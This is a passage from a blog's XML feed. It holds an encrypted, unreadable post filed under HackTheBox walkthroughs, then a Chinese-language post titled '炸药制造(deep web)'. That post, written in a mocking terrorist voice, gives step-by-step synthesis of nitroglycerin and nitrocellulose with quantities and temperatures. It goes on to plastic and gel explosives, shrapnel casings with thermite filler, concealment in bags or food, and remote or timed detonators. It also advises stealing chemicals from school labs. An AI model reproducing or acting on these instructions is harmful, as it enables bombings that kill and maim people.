b1d9316008311eb8c28894f136fa5826c0e4347a16bc928abb2a512bb2b4c33e35760e75471b19de97b43a36ebf0521842d407c4d2ea4e4a166e1ee883336bf815aa63673767e8301532bafa839fd01832f42014c1111345b079bc17856116559b101ac51394f903b158567a0fd4ee232aa18e772b418858654b87e73978f61d73a1f8b627c959be1de69c317e52a4cb63e2702090334970440b7d75bc6923ef5ac4d63d47bdf01a57b876cd4b800e0d34dede3c6fae9d38c46fc0dfd66317b63b0ed59962ee8b5f569e42f29c77683af68b0b5a2ed3928392443bb47e52e21a9a63c279ee1870ac4fd42803659cb634da6629928d2a516f14cff8c5ebd5c66b145930081c3220717d38d5d73e7efacda16f90cf5cc8a510ce7cca4d3ad82b667d20d71d585e7d7b7369f622f26ba7c0137eae410db5b80a88f71513c85fcb8fde9600e10264d093b4e2d92d1cbe21f1d92d0c9cb86667b86a898f5fe0181912aad55efc04444fa786c0e77bd318f6838f29dccb232350d4072d1a3c46d57d8dccd872db578b98cc34b8957932ae6b5f5d4f86ce64aa56a9497d0001d03fcba84767fbb5d3af28c834ae87c31b8db0fe490cd589e476fd4c89eb7d526d4742377d5dac3bdd204e176e0b694f0509935086c5fe64ea251bb96d5ecaf3b07f2008338c75ec0a18b2c352d1bf08fae3ae2bf35df01bbdcd4925ba753f809f955983142db823fd72a3fb9303de0d1c4d3d81ad4132b1fab3001bf9d773e468e0f8b64cf8bde5c017a19338f28722714bad289e3e5507a235e6d790961b3361c9ff0e4a006b7fafee803fce37c59e128caa8fd882865f1aa168da2fae248d78508cbfea1ca0475891129e2681edef1817ef6b01ea8a0b291ee33b5575f731470f8b599ece95dacb3337fb69f2e5f98b99c5de85645f4ff2d1023a5c95e6a6afc01a232f567087220fcb548ac4c8f096ad9c026a5450374195c9d9e2092d582247fd1cb6c65b090afff82635a8aa42bb8303f2685f36c96c5539ca8f57cefedfdf95989f47daf9d59c228c7a3f205e4d4e83fa768ec22c8cd89650ec259d7b3a8fea8269f664f550b37b5c62f0b8c637b6740dde8f15eddecb6a86a6ccba3d35d560eeea3322b87a50dd46d68c8de6514c9eb77e86f5a13532e90f1a24b69e83efd2b2a8b005c71d0a3ca269012c91ecc2e663fee1d2981ac10ba84a1b3ca4f99117c7e6684217a897886a1ebf897ea85833e196ff98625b866185797febfb93247da51f58aa7d4cafd16f44fd8477eadd1b2255ef13e6bca187ffb821e335cf16ccd85433e4fa91c9a6c7ba3d7ccb3dc098d46ad909f88c2d90acbbd30e1b70965d3496bd5bb84e96d04686348f19ec1b3bd719c45b1d801ce6bb9672e08e41ae40493575146afeeaebcb4b4e6ee233f1eb69ace1ab94195029041bdd63bfccb9978a65e97d512062e757b99e63d860b260740ac57e028370533b03fbfa756a507c6a92995c57840548a8d258e5d28c0983215bfb7b6eca08e900f58131513b0dc4148cbf4798828371d1afcc86baa0ee033d2ce9b177f13e47c07f9d145bf8ca60c9bfa57353d16e7ff053e58114e0be9fdedecc2ebcaffbe602a85e25776e50c02a54dea3785bc4f67b17a06da92d444051a9875d3cf5b81c233fb3da711a6335a1b08118388445e215d6d42f04918dd2b3ea2a6e83524a81eefc11e12fb3a4a71470066005f55079623557fed074962b7cbb4c36a54909fecbeaaa4b2109e2ab49be31597e3ce3ffba5480677cc01f9b593e7d2c59c0b51ed396f3905ba0cf9cb9a78846a2ba0128ee802582b99381af93e8a0bf5fd20c9559aa40c78072cb560461687567d1a34032b775ac1d141eae0c181888314ad76099015a4c417a99805ab75b3e7f5935871eedc054ebd88408854f584dc1043677b13985d19e5a19cb30cc13edb82d8d7877751afb6cb729a9d2d6afa91c58b82866c2953513479c2a678dbd29a4c779510de210f168093a66e1ad74fc6ef45d0ce96ad4b12b5e7b6c0151143f72f7e2279127d20119344086ebe9bf2b9f6e249977c0fe8a4bf2c79e69e9ff61d30613063e871a85800b6d6298b5fe957d1412230ca7ed49d5c6f361ee01d8e69775f389e8388877ac274890c1a334a26ff33f30e50364fe2a850cad3a25b0921738565f83882a808001c2a69a9f564177aaba5563a82a55ba613519d7dfe947f4287930dc5889549788f04d534a05108ab9ac105fa4bae13fd5bf4d87455c8d942176627dd4408ac2c561a7bd956a0b7a77cfb5e85a60b7fe0d3d35325604c85932f490ef54fcfb8ab2f8676dd4648af3aac825f31d47836368386ea63e78dfffc50587d460b5c87501f4798ba805412a447a18d7879be60576b9461e0672aeb91639c8cdf52422a3fb9b8757b816238db3044412245d4975f7664d8f950ec39e0a9fa20f24fc1749f344d51ea62b7bbce461de8f9d62b05fc9bb911e980ea639178215d0adcbda75fc00d644beb5f03df16cafb4702732057bea73164145f557d30ec5fe2ad72a1cca9e08c9e460f840eb6544edcc7641c05664ed1001699142d3f55fbad2d18ddc0e4eda994909560e96bf1f8e03f768588630d8fbfe20255abcb27b4d9708fd988bf9c191020b02606b3fdc9fdfe6fd745612b03175f2d65863b91fedaaf8e99e633212c4b5409df37955e8b7fd8d52be9dbc771679ad168100378f54d23c11ef219148ce02d5ea2724fa3a87f648afa1aa9128c753809be4fbd0bb5c24ce7aea6781ea4b7a6bf35d000f31a27d7ffb03c1258e60920c1ab1f268655fc3b8e6aafa933066aa98d4c003fb4837430420c2dbd06d41daf95b70eeb0d28f0274a5af713eca986e08dc4894ad121c49165d7e9a7e0b29e74585425e70c1ac29b04a72962083a099e27526cfab57c1a2148948b5a64149e684622e96d1e6154c5087ce648a62770027b52ec1ac4162878620aee9d6d0c72185542fadd8c359ef646155cd6414d343301a17944e9ad6657478c8c1aee8dae0dfa544425ec21ca8f88d650d79967fddddb19249c12e1c164e92426020450ae651fd71430d414341e837a627d419a14743d082a500f13ed782b93c0d5b5fcb6461b82df59d7d22f1eec6b1057a89a8aa78d9733db5f6c38780c79538d77842416402b01938ef1c761dbceaf9bc51b79fc1b4172f5aa94d5f3e25c9c7430008573ccbf4f48bbbd8c1777bb2bd3b500bb91e6dc05f1775594cd1aa64fee2c0acdbbdf87cb9d940f9d3b911358edb15150e21f8032641dd86f87451376aebf6b7bb2b277b942c0455ee7f02d6692eef8f7cc2d34fab1d730c7b542c4114277e408ecd2f85bafcf1d28f1b02410ff50069a61146ebd557dd54e71577121dcea9fc651fe5c78b93f7f39f40d04f19942003823e2d756cd014d18299435987c8a5aec8254e3a679de9e81737c4ed5419f13e9f9ec0e553413d34a72e6e4e0bc37d9bafe5ccb7d972bb875358134404c9bdc7170c2e97dda353a5a6fd076f9aba6e82780a7f13210fec2ac848114f2abf2ec8037f2dafd08cd4ec7f5c8d25d9005da68aa1d14cb8e9551c7bd9b9b28fc238a0cf63564bd30c94bd7df1f5e8649d47ba9abcb0b5518e5b62993525c319f8bc18b5aec5d86e93482881ff85ee258949e2e9f726c64f5a9244193de021e9a75fe2f661cef6108e46628643312895e7e416c23fb261a6ff92912f26b98db7fcbe20039c04d0ddf789dad486aa9dff70d98283178d615e25bd2405a4321491b516bcb6773728f4c9fd5201f33de3c5ca219f13152e3ae90cf674de7f566dbd69ccbad80c1bd3db5ca0477b95eda8d20ff06ae9f8430662b1357444f20fb2cdfd8ac76ffeec898c4f406e5f604b442360433c80e47aa1c45577da9c3378ff59651a5ec85eaa9f8a1fac76fa4f2537486b661490a4145cb23a747d2e9c13b2637895ab62c794f1b59de9cf712700bd9f9f021e53f1d8983834c9740d075fbedb84be73a1b1c852ca6fbaee5534b1bbb1183001b4722035bccc4c3cb004b4bd0c7005eff14726eec3b5e71f43bf3e4841fbf56c5afcbfa745fba0da117695958ad3b08fcbc660462797173405e1de0ac139b22530afc8d75e9d46b99b573515a6d1cd1ab596d2b994e465dc66c2e667cf96c66d90b86458da4aa18493de06cf919df4d43905a9eecc7a81f09aeaee989592b276404b4010b80ddef6b7f9ab886c51da56b5b3a02bfee7d1753b36fd548502737cd869c8b9b213d12231c4520285d9b5468b1a906c6f08800b22664d63f58835bf3158bc41a3d309e9188a4c153cc0f1c7c62eba615eb88bd3d7e5624256ffe2de73ce40995ad599685d4b26ef809cc0ce34f330e0ea00e44156eea630d32c3c9e225cc9395e508be489b177e8f70eb9f9e09af9c0c1beb30eccbed861f5e5725fb84a9241f922f2ae40ef96366a12d31a70239b68c38edd669b7f9ec1560b327db99fb327d8087400ec6523aad155e1d7b0fdbdfc7069bfcc2043091f3c491276862fa36f8abc1264651c3010d9de7c19eac8bb5c8230ab68c99f328483d32f147e24853ea88bef06140dfcbd19d6aa3a6cbb742ca8bcc71a33cee482c3d973655c9cebb69f2b15a39125b5125ca8f48ed95a4d9a094f60dbe7533f017beb8205b121ec97e32a72c6c7cad7ac91b7c9afc3c7e8d64a780d66fc417f806f1177adf771cd29fdb8b90338b434e9d7add3dcb7d11ff1ae068e42cae769b7dcef3e2ec0e4e4d30d7e63c9a764fe8d8d6175a1c8b221bb0900e87db81db928876fb0a007a79bbe104594f07df9958201d9212c93c835c7d539eb9ca0dc658dab403d8fa1891dc3acacebd8647b08fa57872b4cdf7441bd945154b35495d383caee354d23de1842db8d39bdc56eeae2d65170468590b9a9ea55468534348baa08a6b54c9ecfe533d57593b132a4c0b3128c9443dd2558052fdfa37a7322f82d3447bf786c933fde40838a8225984c27d4766fd1f970ff6cd4f64fd07890ca0914aa512feeb00dd435ed1c5ca734fcc67395eff997a2a943f36e249a25972df155966ca7c0ef4c620f0aeac44d394d64d56cf23c6d891d107ce2dd9280bb8b0cc4aed063bab4520c00610763e2d346bbc73d60f1becf7bd20d5a892ff36342ba1146e6796a4430148bdff4f344da75e1d8df21b512164c3e8f9de301baad5b43a59df58f152d9ce175b32316a03e6789655657e551ca80ccf05a5dee8ed4da8c9aada141b75a74d63f878c2fcc66d72fb5fa801c72702e39c4de326f42d04746b35487f257ba6812ee0d046a06d7a7bdfe39462fb88d8d7d62c6c2ac5fbf35fab74c4c681d30c7f8878073766a09936b5b4336367ed761f43b5c182ca4e521e8ae4bf3062ac3d81321a26b0e77872176303c000dfe16451995580cf547a36043a92e06f16eefe3bcb7d8cc4fecbaf012fdb77942685bbf2398a19746190fb447a416aeee62e43941cfa11eeb69e42b66b0fe41f4a929559a3e98f389a349da4365f0796bff847fee65e0dc83da842e1f47c6e264b4484b582eb581bcb69ff2a08e0c207c760e4700a94b45bfe2916cbe6bffa0f0b897b8035dfad195ca22de9c81fb776dfff7d71646ba2ad981d7c5cdbd6b1a58c40a22b9549969d35ebe0396242cc461954512f839f22735233b0ccf805eccd7c07739a14b6cc66b99243d08d13d8ad94924d1e3e07cd67d74a44240e35eccc38ff581703940d20dd634e77a2edd82805108c7a74682320039ba8868510f986356fb5d1593e52067939538a2d0ed13271592b81dfff6d930a50b0b65c81061443e520674d388873552cac394c9c8efa0f35ec5600e93bac372054b9e56a165679bbaf0aafbf1591394e814f7f6c275b3b5e4d0830f032a1f2daec1b45b70495bb91c8b72fe3973db01725199c73ba4cca24406f3b6098ff1a897e33e25425bb608b9515151bfbc07ea586aa77d9ab27d02ec96438172f79238ac7c9ad70f385ecc75243d866451ec552182b2121c9ff97e2a011a9415183fabd55aafb97f830c4efc85fc6f31f3b27ddab2ac99ed8042e25b029f1af4fc2673fac6d5e53496eb8d16284ca5f9015837a0c5123fde00be7d71d5e8a4de182d02dcb53e2170a893ed81c62ed4b43d313dec08c60e7855392571a5eecc934f5b1b08e1f0b0bc9d4336af13b04a12599d9ce16ccddea25dfd29548ec44a6d0665cf82028ab7e9509933bdc7f6dd838d5f2f51e5ab7eb8365b34717868cd2d6e3bd6372540cc5e1de84fe389df54d70fb054ec91f8b57ae234753fad0908ad22e4d609b7edd827bced5be315fb5ef9cc80f4e3aead71ad40f2b0f9410b643f5b3909f3540d2a24c7b096f5061198c14db45e7be1802cb2285581fbdc9dffcac01a5443cb245dec7c765e238b17236a01a91453cd2031600f7b759c2145635a186239f3a5eac8eac4d7963225be356716cbfafbdb7f2a7f5ffb3472a9322be3960bc4954fa8abdcd106c8f26ca29317ad6090c31f636f4d21c002194c46394cd8052491f27a748a865b666635d45e9613410dfc27d2c36c569911d2460cb971855ce8929570d6b53f5866fcee0e7f9620e39ab7cd02c1091f8cedbe654e1a8f30546057f9f1dac579d0e383475b3466485c3f83137bdc2c972f7f418e8f6255862c4d380f4df6e1791cfba3260fd55344eee767f98792b5faa54256b9a2041c57fc64b5cf1453390784d56ee868690954e3cde68cb503484e25d3126256b1b7ed7f2d059c235ffeb5811696c74cab430e3fb3abadea175ec89ed3117b6eed7feefc660aaa12b15e53d5dbc36a6ba709c531bf9d0dac4af3127ee9bccd0f6797576df07c48566240c57d5a7e2fe0de024ba2a9519496649ec4c7179dcf803840da2c31f2ca5f7797a76cb2f132b3f49829973529357d59b13a074f88c9317f557a9b63c6b4f0ff466d16bc4cf5b00c396cb2d0ca211e9a5b46f21fe1e79d8a86f770157552fe0db3b5fac7fdcec8ca535f60f9cb245912cfb01b2feb649cf29e23927b1207b228f0f90a837575f64af0b46c185d4a30fc97a69d48fc9f29436a1829a65eabd584db081eefc81676817e82614845875db5b610c1bcdbb69f77def751109e99565fd0b60456e59333298b4d3bb21eaea4cbe51bb65307c1cb351256712955d3f853d88ed7a6fb5717b9faf120b15c735a9a48637773ba0b88bba0d56a99d76b8a561ab7423fe3398e703347d6a3a601542025fa4cad9b2c3f4c1e8882e9eb3a7c5d88dbd5377aee771da47831168d72c33631e0a53df4dac91fe16c5dd7a2cf229bc840bacbc498bf20fa81187858047d52ee5bbf25c33a9a2395147b20fd1a2803d480ca22160b9e40bcf6a6d52ab2cd308d711bc943fa558aa952306493106c27ec1d06ecdb26ae6464e1d6f7e95575669924913d5dca668e93cfca934899465a75f3d9d4eb0a82062b3c651faee4f3d97221478e2121d11a4fa478d4e41dd9ee0ae21c3bce2522fcb6a7fc106df2901f3187ffd35681c516fd3fc41f17372e676ba538f7bc2a779f4965d356dc3069e1a7fb640290e968a4edf71ed5bef7b20888d0e603c13045cea466ddeccda9a65aacc7c6ff2e58f38a17c24e7fa690f7c8b9387846daf707d667486972caf5bbdcd462b8f815e8490754a7417854866a76b6cb25d1e6088ed481a32637b1320045f03d2c483556da73b031f068d9a24a412d7397634c72ef151a2111205db2920a2846321f336ede6f10724a897f1e737bad8aee9366e90c1512e52d45ad4083265e876d88b1e5ca2f3286c3af7d017f69c5d4be58369c706cc4728ee2254eed0d69a411a172191ade1d5a46bc1f212b293eb52a88902e6d8bf93897f7596fbc09253377aa7f06b514db9134ae0975d2cf8a6caa25b2b04b39ccd6eac998de4f75ed172cb95ff3c4a91b2aa5db5794036c25858bb7897c94c41dddc4859fdda8830f08b8c6b8243e599f80aad9f263b9479f24631036aaea45074652efff0bd936602fa4040246a3e9a0ce4d5a39b775c3c48296dd9a2b750a0a2801f1b8847215dcc581ddadb062b1c05f92c455b0214e81c3a05bba95f5db9b89dba86c149224296c9f52e7e08a71ce6ec3853edfb8f1ebef766b4b2c51192f7650c42e8c60d12d492c594ebcea1cff5dd08e26165ff57c67dc15fdcce47e8e2b891bd7c3e1cc98b7ec7b1337049f7c32b741092cb6aa91311ae7c1ca4b5f8fda07424ad19a1815a642c0104a881fab13b01f3d18b6484dce510cfa170aef53a7da5a8b1c3b62c6b7e060b9533efd9c10b383740af4749205ea0b0d925fead7ff408c8e333980427872d12f90e9febf1884d925125f47b729c97713edf3761b599f13f9e7c01f7e9f9b57435226a38403d810d33b8e8874dd59ac33672586c8fd0a64af9336d1e57d77ce29274b766e49c5279b45e90467fe89228abc11690457e551691c77f30ea86af632dc3a8df162421ec98ee47c5d8b72a88672aa8aabb94ddf6b6170567d09511e3e92dbea4a2ded095182b3df2b891857639cc68f3150f32ae0cbfa54ecae43daef99a2f5bc8a081332e04247427618c46183e0203175ac135a09a9472213bb05cbfb4af07cf32d1408b75224d2de027085e76894f9dba5b18162b06cbc696440bb675ae959d3694d68dc8ff4d5229ffd4a234f7ba28f3d0ddc53566bf004cd61f3395c33f04b138b7875fb7b9010d74809097388a72055d12ce11198e194bd4c7d233fa8b3940e4aaa750e026f6bb0b0c973eb2c7e33a9de8341f01bf4a9b8e3c350e8958da4266deaf04d01ee6a2568885b30eb593ccb424942a9e3a0150b09cbbea0d3fd39aa26cd2c4129402f31a46f629e6549fa8f3aaf69c7bf2eb5822a8dfb8b777dd19c99ec1fb72aa0d731c0d1d9361cb7caef4bce0d5fda2b43f75f4c8e5a17896f0eafede97cfbcc3220e630e979a708dc38a77700132a7cf9a6110be47d24ec12da9708682fbf41a2f9532bf4ccc45f088aef8ddd80f43e4ae81446cf412e0870bbeb93084560cb874a4aeb4c95491056ce2187f641722a513eba27ab91c382b20394afcbbf58cc8125d64deddd5ba6e74e20e4cfa10127f55db13e375ff52b941359391031859681a6ba9e3ffbf09f596dd1cf309693791e584efac9cbf7657090b29fe8615aa56b7a28a15ba81ef7dabd5af04cb3488110d3178cb88a42ba5863ad06b0a6078a8b6170d37e1a590ac2a75e08602583e8ba2c7565d7c5869d5ee93ea8eed23d4056659cd85b5c315b79f02256915a62665f754f9d66663bbc3764c10aa97c262363960ba22096d06f6e04d7f4b8458f4461004fbb3ffe3b9d2b15db62acebc6119a6a7212db41a77cfbf1fb6f6ea44001848fa5dd0e8c944f065259452385d8d6b46817942751ba8207cb05428ba5e3d1c255cefd855609363bc1c0216e6f951338d2738091f7426ca97598ad994a9aa18a0f7c37cceca99ec077b15f1677d3d1370524603d9cf348a5ce12a3fc8b6607a83a88cc38cbc85115208dbbfc0c7b01d50b0ebe87af284019224d509a044a73e9eb9d0413e513a1455afe18dec631387ed18c3bad926154d812485535fc32b4b955c2e67243489782d5b109b954a9eeb08370a10daba42f927e7556d45a75c8af6006fbf23d62a9e0640a037645d368c81c6f3238c7cc393eab7ed9971efe190e2a47cb29bb39a3f33419a192c23f9429fa467d7a71d57a794ebfbb37ede0766e6692bd2aaf33072317fdb37ebceae4a365bca64d411d6e1feeca22b556eeebc6eed673d9efac93033d829ed3d14e3f553393109aa276633fb4baba48eeab25e87951ba6c01b836ce8cbda8efc14ed58d6e7b984fe09200ed8e92e1132eb9540db7bb294f5c6ea8e1a858d5b30f3c089025187f85f5d208ec91953818b31eff191dc28807d0cbf0a2fe8030657fc1f22767928c97bfdd5ac4fbc6a124975b4b0e1033a2e644c6cabfb585b6b53fc6237b404cb0efd932e4efc81e05f2f9d4b123411d286b4e30e5ff07793c61b5f030c42978133fabd383dabf31b605211185740ae97b8f9ee11b2a8258c354e9bf0acb1bc102c2c0271efd677e4a7e47f49e3b3aadb9911804ff4948cccf6e51c287be12d2da2951bacb3eebecb3bbc948d0bab807c2491e9d9ccb19175b3da408f02d6420eb4abf7933c02c78f0b0f34f4d67836a1fbaf78630d556a1f4600321e39ccf587f05a7cb3b8db79eecdefe61928ae3c2eb146b95302e77c27760fe90d93917129f5273000a1ad21ae10bc5381b0db0f1fd0114657f1dd64</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>炸药制造(deep web)</title>
    <url>/2019/02/06/bomb-deep-web/</url>
    <content><![CDATA[<h3 id="从原料获取程度的难易和威力比值来说，最适合便是硝酸甘油炸药。硝酸甘油制法具体如下："><a href="#从原料获取程度的难易和威力比值来说，最适合便是硝酸甘油炸药。硝酸甘油制法具体如下：" class="headerlink" title="从原料获取程度的难易和威力比值来说，最适合便是硝酸甘油炸药。硝酸甘油制法具体如下："></a>从原料获取程度的难易和威力比值来说，最适合便是硝酸甘油炸药。硝酸甘油制法具体如下：</h3><p><strong><em>原料:</em></strong><font color="red">滴管，玻璃杯两个，碳酸钠（俗称苏达），浓硝酸，浓硫酸，甘油，这些都能在化学药品商店买到，当然为了避免暴露身份，比较推荐的方法是到中学化学实验室里面去偷，一盆水，不需要太满，一个搪瓷茶缸，最好还有温度计，注意家里用来量体温的温度计是不能用的，一是量程不够用，二来是体温计的特性在温度到达最高点之后除非用手甩，否则水银柱不会下降，那么您很有可能就此为了伟大事业献身。最后推荐ph试纸，当然可以用普通酸碱指示剂替代。</font></p>
<p><strong><em>步骤:</em></strong></p>
<p>1、在一个玻璃杯中加上大概80毫升的水</p>
<p>2、在另一个玻璃杯中除加上80毫升水外，基本添上一平勺碳酸钠，所谓的勺子是指不锈钢的西式餐勺，如果使用中式的汤匙那就差很多了。配成碳酸钠溶液。</p>
<p>3、好,现在是时候将一个搪瓷茶缸放入水盆中了，然后缓慢（注意）加入8~10毫升左右的浓硝酸，用温度计测量温度，要到20度以下。差点忘记说了，冬季可能比较容易，夏秋季节的话，呵呵，那还是准备一些冰块吧。之所以那么低的温度是浓硝酸在高温下分解极快。</p>
<p>4、慢慢地加入22~28毫升的浓硫酸，也要注意，速度慢，温度要保持住，绝不能再高了。有条件使用冰块的还要低一些。5、用滴管把甘油滴到混合物上，速度要慢，每分钟大概4、5滴就差不多了。而且还是那句话，温度绝对不能上升，否则您很容易就去见马克思了。一直要滴到甘油在混合物表面形成甘油层为止。</p>
<p>6、在低温下用筷子搅拌一刻钟。筷子用完以后千万不要再用它吃饭了。完毕后把混合物缓慢倒入蒸馏水的杯子中。硝酸甘油比重较大，会沉底。而且由于折射率的不同，两种液体分层后，两种液体的分界线还是比较容易分辨的。</p>
<p>7、把下层的硝酸甘油滴到碳酸钠溶液中，目的是为了去除多余的酸，因为酸性的硝酸溶液氧化性非常强。是极其危险的。至于够不够到中性，就要依靠您的酸碱指示剂了。</p>
<p>　　制作完了之后，千万要注意不要振荡摇晃。如果那样的话——向毛主席保证，您一定会见到他老人家。如果您想试验一下它的威力的话也不是不可以，通常可以取一个小玻璃药瓶，注满硝化甘油之后，从高楼上任它自由落体，你会明白什么叫做东京轰炸的威力缩小版。</p>
<p>　　另外您要明确一个的概念是，炸药和炸弹是有区别的。瞧，我们手上已经有了炸药，但是它还称不上是一个炸弹。我们辛辛苦苦制造出来的“宝贝”，如果一不小心就会要了我们的命，当然我们恐怖分子并不害怕为了伟大的事业献身，但是壮志未酬身先死未免太可惜了。每天要提心吊胆会多么严重的挫伤我们的积极性啊。</p>
<p>　　下一步的加工首先是要让它变得稳定，通常，稳定硝化甘油的方法少说也有100种，最流行的恐怕就硝酸甘油和硝酸钾、硝化棉、木粉填料、矿脂、活性碳粉混合在一起。当年伟大的诺贝尔先生就是靠这玩意一举成为大富翁，还创立了大名鼎鼎的诺贝尔奖为世界科学作出了巨大的贡献。当然现在我们作为他的后人也不能甘于其后啊。</p>
<p>　　扯远了，刚才的方法是比较流行的，但是并不是唯一的，般来说，把硝化甘油和挥发性低的次级炸药、粘结剂、填充料等加上其他乱七八糟的东西混合在一起基本可以满意。为了体现每个圣战者的个性，您可以随意选择配料，比如面粉，鸡蛋，蜂蜜奶油，冰激凌等等等等。我个人的偏好是以胡椒粉为主，用方便面的面块固定（版权所有，盗版必究）。</p>
<p>　　如果您制造的硝化甘油数量比较大的话，那么您就无需费神考虑弹体了，一个普通公事包或者旅行包完全可以满足您的一切要求——携带方便，高雅大方。特别推荐皮尔卡丹的，它不透气。把固态的炸药要往里面一填就可以了。不过您制造的剂量不若不够大，那么无疑好的弹体能令您事半功倍。一个普通市民想要得到手榴弹形状的铁质部件不太可能，建议您diy，不知您对以前的雀巢咖啡瓶子是否有印象，那就是一个不错的弹体。重要的是如果您想锦上添花的话，您可以用蚀刻玻璃的方法将表面划成几百个小块，什么？你不知道如何蚀刻？那么用玻璃刀也可以。当然您还可以在上面画一些花纹来表示您的高雅情趣。形成独特的艺术流派什么的。不过别忘了把他的头部塑料瓶口部分用胶带也好什么也好紧紧封起来，以便玻璃瓶体能够顺利破成弹片。再给您一个狠主意，如果您要对付的对象是十恶不赦天怒人怨或者和您有不共戴天之仇的话，还记得前面的填充剂吗？您可以把它改成铝热剂，也就是所谓铝粉和氧化铁粉的混合制剂。当爆破的时候由于高温，将会使铁铝发生反应，变成氧化铝和炽热铁水（亮白色）而四散飞溅！杀伤力极强，如果您有非凡的目力，您会看到真正的飞火流星！注：可能性不大。</p>
<p>最后就是引爆系统，用一根药捻子的导火索无疑是会令同行耻笑的，我目前有两个备选方案。</p>
<p>1、用对讲机的无线电系统，把一个拆下来之后，会得到一个共频系统，将其中一个制造成短路情况安装在炸弹上，然后用其他一些见电火花即可燃烧的炸药放在一起。这样一来就可以实现通话——短路——火花——引爆药点燃——炸药爆炸的遥控。当然无线电话是更好的选择，播一个号码就可以爆炸，简直就是《间接伤害》的翻版。不过缺点是成本高。而且还要担心串频走火还有某个不识时务的混蛋给你打电话，那可真是死不瞑目了。</p>
<p>2、定时系统，也很简单，普通的电子闹钟就可以胜任。手法和上面的差不多。不过，你一定要有准时的习惯，表也得很准，呵呵。</p>
<p>　　好了，本讲座就到这里，祝你好运。如果各位有兴趣的话，我还会继续推出其他制作讲座，比如很受各位喜爱的tnt，塑胶炸弹，燃耗弹等等特殊要求的炸弹。</p>
<p>　　上一讲我们已经谈了硝化甘油炸弹的制作方法，但是除了硬碰硬的纯大威力杀伤炸弹之外，相信不少同道也曾碰到有一些特殊需要的局面。这一讲就是专门论述这种炸弹。</p>
<p>　　作为恐怖分子，毫无疑问业界c4是最大名鼎鼎。但是c4既不是威力最大的，也不是制作最简单的，之所以如此广泛应用最大原因就是它便于隐藏和运输。否则在海关被fbi扣住可实在是太丢面子了。c4主要成分是环三甲撑、三硝胺、甲撑和润滑油。另外一个优点就是可以附着在物体表面，可以对目标最脆弱的部分攻击从而达到一击即中的效果。</p>
<p>　　与之具有同样性质的东西我估计就数本人的最爱——rdx了，它是c4的提炼物，或用六甲撑四胺和丙酮净化过的硝酸混合制成。我的记忆中它可以和淀粉、面粉、洗衣粉等等家居用品混合而不遭受怀疑。当然你要是愿意，白粉也可以。更可怕的是他可以和面粉、鸡蛋、蜂蜜、香精等等制作成饼干，曲奇等等绝对杀人于无形。一旦需要，只要把它用一些挥发性液体泡湿然后捏实就可使用，实在是居家旅行，杀人灭口之必备良药。嘿嘿。但是他的成分都是比较难以得到的东东。所以各位也只能望料兴叹了。</p>
<p>　　好了，再次回到我们的问题上来，那么有可塑性的炸药就真的没有办法制作了吗？不是的，这就需要我们来发挥创造力了，本人经过多年潜心研究日思夜想终于在睡梦中发掘了一个成本低廉制作简单的可塑炸弹制作方法（门捷列夫？），啪啪啪（鼓掌，山呼海啸般的万岁声）！c4，rdx本身具有多种性质，但是我们在某个用途总可以得到用某个替代品，同时也可以依靠混合物使某些炸药附带上其他性质。也就是说我们只需要把不可塑的炸药和一些可塑的合剂杂糅在一起就可以了，最简单地说，把汽油和面粉揉在一起，就可以使汽油具有可塑性和粘着性（恐怖的汽油面团？）。好了首先我们要确定分散质是什么。我比较推荐的硝化棉，学名叫作三硝酸纤维酯。这玩意的出现大大促进了现代枪炮的发展，后来我们的同行——法国炸药工程师p?维埃利于1884年，诺贝尔先生于1887年，分别以不同的方式改进，造成了无烟火药，至今仍然应用于枪弹、炮弹发射药领域，威胁着几十亿人的生命~~呵呵。</p>
<h3 id="好了言归正转，制作方法如下："><a href="#好了言归正转，制作方法如下：" class="headerlink" title="好了言归正转，制作方法如下："></a>好了言归正转，制作方法如下：</h3><p><strong><em>原料：</em></strong>浓硝酸（百分之六十几那种），浓硫酸（98%），药用棉花（药品商店里面多的是），容器自备。</p>
<p>1、将浓硝酸和浓硫酸以体积比一比二配成混合溶液。注意要慢和冷，搅拌均匀，详细说明在我上一次写的炸弹制作教程已经写得很清楚了。如果您需要指导我可以另外给您一份操作手册，当然价格嘛～</p>
<p>2、将药用脱脂棉浸入混合溶液中，要浸透。想想着这是你的仇人现在要把他泡到酸里去，嘿嘿。</p>
<p>3、小资：泡杯咖啡，慢慢享用。看段芭蕾舞。</p>
<p>情歌王子：把“你是疯儿我是傻”唱上四五遍。</p>
<p>李宁第二：做俯卧撑，引体向上仰卧起坐等等。</p>
<p>瘾君子：尽量离远一些再抽烟，否则我不能对您的生命安全负责。</p>
<p>4、看着时间到20分，请大喊一声“大功告成”，然后以迅雷不及掩耳盗铃之势将那块棉花取出。</p>
<p>5、用水冲洗干净。请确定是中性。</p>
<p>6、摊平棉花，在一个风和日丽万里无云万物滋长的合适时机放到阳台上晒干。7、收工<del>~</del></p>
<p>差点忘记对您说，做炸药的时候嘴上千万不要叼着烟。什么？您已经殉职了？请允许我对您表示沉重的哀悼。：（</p>
<p>　　接下来就要看您的用途是什么了，如果您只是做普通备用炸药，那就压实，封包，比较直接的方法就是用报纸包起来用重物压好，最后外面用黄色的宽胶带纸层封好加上足够长的导火索即可。一般可以呈扁平形状，当然其实你可以选择其他的形状也可以。它适合在比较狭窄的地方爆破。把很窄的缝隙分离开来。</p>
<p>　　我相信您在对付一些门锁的时候，曾经想过用炸药炸开，这种时候相信您会考虑塑胶型炸药，制作也很简单，把刚才做好的硝化棉溶解在乙醇和乙醚里面，加上树脂之类的东西来调节它的粘稠度。必要时可以添加类似口香糖之类的树脂，制造成口香糖炸弹，酷～～相信007式的情节在您手中再现一定令您激动不已吧，呵呵。</p>
<p>　　但是事实上我并不推荐用乙醚来制作这玩意儿，因为乙醚是一种全身麻醉剂，浸透毛巾后捂住口鼻可以使人在短时间内失去知觉，至于怎么个短法……，我没试验过，从电视里面大概是几秒钟吧。总之有很大的用途。</p>
<p>　　另外一种还是我们的偶像诺贝尔先生发明的，把硝化棉和硝化甘油（制作方法上次讲过）混合，添加树酯等等可以作成胶质炸弹。威力更大，更重要的是在热气下可以压成绳状，那么物理性质应该类似于加工过程中的方便面，呵呵。通常来说，为了避免伤及无辜，请您在郊外盖间茅屋，以响应我佛慈悲的大无畏精神啊。阿门。</p>
